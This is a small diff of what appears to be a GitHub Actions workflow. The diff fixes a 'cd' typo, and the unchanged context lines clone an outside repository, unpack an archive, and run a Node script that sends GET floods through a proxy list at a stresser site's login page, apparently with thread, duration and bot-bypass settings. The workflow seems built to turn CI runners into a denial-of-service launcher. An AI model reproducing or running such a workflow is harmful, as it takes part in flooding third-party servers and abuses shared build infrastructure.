@@ -35,7 +35,7 @@ jobs:
           git clone https://github.com/Fegp1p2/ideal-guide.git
           chmod +x ki
           unzip Fc-main.zip 
-          cf Fc-main
+          cd Fc-main
           node a.js GET https://susstresser.com/panel/login.php 800 4 90 proxy.txt --bfm --debug
 
           
